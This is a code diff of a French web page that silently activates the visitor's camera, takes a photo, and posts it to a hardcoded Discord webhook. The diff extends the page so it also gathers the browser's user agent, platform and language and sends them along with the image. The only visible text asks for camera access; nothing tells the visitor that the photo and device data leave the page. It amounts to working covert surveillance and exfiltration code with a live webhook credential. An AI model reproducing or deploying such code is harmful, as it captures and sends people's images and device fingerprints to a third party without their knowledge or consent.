@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prendre une photo automatiquement</title>
+    <title>Prendre une photo et envoyer les infos</title>
     <style>
         #camera {
             display: none;
@@ -14,12 +14,41 @@
     </style>
 </head>
 <body>
-    <h1>Prendre une photo automatiquement</h1>
+    <h1>Prendre une photo automatiquement et envoyer les informations</h1>
     <p>Veuillez autoriser l'accès à la caméra pour prendre une photo automatiquement.</p>
     <video id="camera" width="320" height="240" autoplay></video>
     <canvas id="photo" width="320" height="240"></canvas>
 
     <script>
+        function obtenirInfosAppareil() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+
+            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
+        }
+
+        function envoyerDonnees(donnees, imageBlob) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, 'photo.png');
+            formData.append('payload_json', JSON.stringify({ 
+                content: donnees 
+            }));
+
+            fetch('https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu', {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Données envoyées avec succès');
+                } else {
+                    console.error('Erreur lors de l\'envoi des données');
+                }
+            }).catch(error => {
+                console.error('Erreur lors de la requête:', error);
+            });
+        }
+
         (function() {
             const video = document.getElementById('camera');
             const canvas = document.getElementById('photo');
@@ -36,19 +65,14 @@
 
                         // Convertir l'image en base64
                         const dataURL = canvas.toDataURL('image/png');
-                        envoyerImage(dataURL);
+                        const blob = dataURLToBlob(dataURL);
+                        const infosAppareil = obtenirInfosAppareil();
+                        envoyerDonnees(infosAppareil, blob);
                     };
                 })
                 .catch(function(err) {
                     console.log("Une erreur est survenue: " + err);
                 });
-
-            function envoyerImage(dataURL) {
-                // Convertir base64 en Blob
-                const blob = dataURLToBlob(dataURL);
-                // Envoyer l'image à un serveur ou un webhook Discord
-                envoyerBlob(blob);
-            }
 
             function dataURLToBlob(dataURL) {
                 const byteString = atob(dataURL.split(',')[1]);
@@ -59,26 +83,6 @@
                     ia[i] = byteString.charCodeAt(i);
                 }
                 return new Blob([ab], { type: mimeString });
-            }
-
-            function envoyerBlob(blob) {
-                const formData = new FormData();
-                formData.append('file', blob, 'photo.png');
-
-                // Remplacez l'URL ci-dessous par l'URL de votre serveur ou webhook Discord
-                const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
-                fetch(url, {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('Image envoyée avec succès');
-                    } else {
-                        console.error('Erreur lors de l\'envoi de l\'image');
-                    }
-                }).catch(error => {
-                    console.error('Erreur lors de la requête:', error);
-                });
             }
         })();
     </script>
